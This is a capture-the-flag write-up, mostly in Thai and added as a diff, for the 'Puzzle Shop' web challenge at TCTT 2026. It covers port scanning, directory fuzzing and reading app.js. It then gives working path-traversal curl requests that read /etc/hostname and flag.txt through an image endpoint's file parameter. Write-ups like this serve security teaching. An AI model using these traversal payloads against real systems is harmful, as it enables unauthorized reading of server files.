@@ -1,0 +1,164 @@
+# Write-up: Puzzle Shop — Naomi Jewelry Shop (TCTT 2026)
+
+* **โจทย์:** Puzzle Shop
+* **ประเภท:** Web Application
+* **Target:** `http://188.166.179.129`
+* **คำใบ้ (Hint):** 
+  > "Jitlada came to Naomi Jewelry Shop looking for the perfect luxury jewel — something dazzling enough to make every friend at the wedding quietly jealous. But while browsing the collection, she noticed something strange. A tiny detail. A careless mistake. The kind of mistake a developer makes when they think nobody is watching too closely. And Jitlada? She watches closely.  
+  > Flag format: TCTT2026{...}  
+  > The Flag file (flag.txt) is somewhere on the server"
+* **Flag Format:** `TCTT2026{....}`
+
+---
+
+## 1. Nmap 
+
+ก่อนจะเริ่มเราต้องรู้ก่อนว่าเซิร์ฟเวอร์ปลายทางเปิด (Port) และรัน (Service) อะไรไว้บ้าง:
+
+```bash
+nmap -Pn -sV 188.166.179.129
+```
+
+### ผลลัพธ์ที่ได้:
+```text
+PORT     STATE    SERVICE    VERSION
+22/tcp   open     ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
+80/tcp   open     http       nginx 1.24.0 (Ubuntu)
+514/tcp  filtered shell
+2000/tcp open     tcpwrapped
+5060/tcp open     tcpwrapped
+```
+
+### สิ่งที่ได้:
+* **Port 80 (HTTP):** เปิดอยู่และรัน **nginx 1.24.0** ซึ่งเป็น Web Server แน่นอนว่านี่คือเป้าหมายหลักของเราเพราะเป็นโจทย์สาย Web
+---
+
+## 2. ลอง scan หา Hinden Folder ด้วย fuff 
+
+```bash
+ffuf -u http://188.166.179.129/FUZZ \
+     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+     -fc 404 -t 40
+```
+
+### สิ่งที่เจอแล้วเอะใจ:
+* fuff พ่นชื่อโฟลเดอร์ออกมาเยอะมาก (`includes`, `modules`, `media`, `user`, `search`, ...)
+* แต่ทุกชื่อมีขนาด Response เท่ากันหมดคือ **`5931 bytes`** และได้ Status **`200 OK`**
+
+### ลองยิง URL มั่วๆ ดู เช่น:
+```bash
+curl -i http://188.166.179.129/this-path-definitely-does-not-exist-123456
+```
+ปรากฏว่าเว็บก็ยังตอบกลับมาเป็นหน้าแรก `5931 bytes` เหมือนเดิม!  
+นั่นแสดงว่าเว็บนี้ทำระบบแบบ **Single Page Application ()** หรือมีการตั้งค่า Nginx ให้ Route ทุกอย่างกลับมาหน้าแรก ทำให้การสแกนหา Path แบบนี้เจอแต่ (False Positive) จึงต้องเปลี่ยนไปดู **Source Code ฝั่งหน้าบ้าน (Client-side)** แทน
+
+---
+
+## 3. `app.js`
+
+เมื่อดู HTML ของหน้าเว็บ จะเห็นว่าเว็บโหลดไฟล์ JavaScript หลักมาทำงาน:
+```html
+<script src="/app.js?v=7" defer></script>
+```
+
+จึงดาวน์โหลดไฟล์ `app.js` ลงมาเปิดอ่านดู:
+```bash
+curl -s 'http://188.166.179.129/app.js?v=7' -o app.js
+```
+
+จากนั้นลองยิงคำขอ (Request) ไปหา Server:
+```bash
+grep -nE "fetch|/api" app.js
+```
+
+ทำให้เราได้ Endpoint ของระบบมาดังนี้:
+* `/api/products` — ดึงข้อมูลสินค้าทั้งหมด
+* `/api/products/{productId}` — ดึงข้อมูลรายละเอียดของสินค้าชิ้นนั้นๆ
+* `/api/product/image?file=...` — **(จุดนี้แหละที่น่าสงสัยที่สุด!)**
+
+---
+
+## 4. วิเคราะห์ Source Code `app.js`
+
+เมื่อเปิดอ่านโค้ดใน `app.js` ตรงฟังก์ชันเปิดดูสินค้า (`openProduct` บรรทัดที่ 103-106) จะพบโค้ดส่วนนี้:
+
+```javascript
+const file = atob(product.assetRef);
+const endpoint = ["/api/product", "/image"].join("");
+const imageResponse = await fetch(
+    `${endpoint}?file=${encodeURIComponent(file)}`, 
+    { cache: "no-store" }
+);
+```
+
+### ทำความเข้าใจ:
+1. ตอนเรากดดูสินค้า เว็บจะเรียกดูรายละเอียด เช่น `/api/products/emerald-elysium`
+2. Server ส่งข้อมูลกลับมาเป็น JSON ซึ่งมีค่าแปลกๆ ชื่อ `assetRef`:
+   ```json
+   {
+     "id": "emerald-elysium",
+     "name": "Elysium Emerald Pendant",
+     "assetRef": "L2ltYWdlcy9wcm9kdWN0cy9lbWVyYWxkLWVseXNpdW0ucG5n"
+   }
+   ```
+3. ค่าที่ลงท้ายด้วยตัวอักษรแบบอาจจะเป็น **Base64** ลองถอดรหัส  (`base64 -d`):
+   ```bash
+   echo 'L2ltYWdlcy9wcm9kdWN0cy9lbWVyYWxkLWVseXNpdW0ucG5n' | base64 -d
+   ```
+   จะได้ค่าเป็น:
+   ```text
+   /images/products/emerald-elysium.png
+   ```
+4. จากนั้น JavaScript เอาค่า path นี้ไปแปะใน URL เพื่อดึงรูป:
+   ```text
+   GET /api/product/image?file=/images/products/emerald-elysium.png
+   ```
+
+**คาดว่า:**  
+Dev พยายาม "ซ่อน" ที่อยู่ของไฟล์ด้วยการแปลงเป็น Base64 ใส่ไว้ใน `assetRef` แต่โค้ดฝั่งหน้าบ้านดัน Decode กลับมาเป็น Path แล้วส่ง Parameter `file=...` ไปสั่งให้ Server หยิบไฟล์นั้นออกมาตรงๆ!
+
+---
+
+## 5. Path Traversal 
+
+เมื่อรู้ว่า Server ยอมให้เราส่ง Parameter `file` ไปเพื่อเปิดอ่านไฟล์  
+คำถามคือ: **ถ้าเราใส่ `../` เพื่อกดย้อนโฟลเดอร์ออกไปอ่านไฟล์ระบบ Server จะยอมไหม?**
+
+```bash
+curl --path-as-is -i 'http://188.166.179.129/api/product/image?file=../../etc/hostname'
+```
+
+### ผลลัพธ์ที่ได้:
+```text
+HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+Content-Length: 13
+
+5a3ef546c2fd
+```
+
+Server ตอบกลับมาเป็นเลข `5a3ef546c2fd` ซึ่งเป็นชื่อ hostname ของเครื่องจริงๆ  
+แปลว่า Server ไม่ได้บล็อกเครื่องหมาย `../` เลย
+
+---
+
+## 6. ดึง Flag (`flag.txt`) ออกมา
+
+โจทย์บอกตั้งแต่แรกว่า:
+> *"The Flag file (flag.txt) is somewhere on the server"*
+
+ในเมื่อเรากดย้อนโฟลเดอร์ออกไปได้แล้ว เราก็แค่สั่งให้มันอ่านไฟล์ `flag.txt` ผ่านช่องโหว่นี้ได้เลย:
+
+```bash
+# ทดสอบอ่านไฟล์ flag.txt
+curl --path-as-is -s 'http://188.166.179.129/api/product/image?file=../../flag.txt'
+# หรือหากอยู่ลึกกว่านั้น สามารถถอย ../ เพิ่มขึ้นไปถึง root
+curl --path-as-is -s 'http://188.166.179.129/api/product/image?file=../../../../flag.txt'
+```
+### 🚩 Flag:
+```text
+TCTT2026{...}
+```
+
+---
+
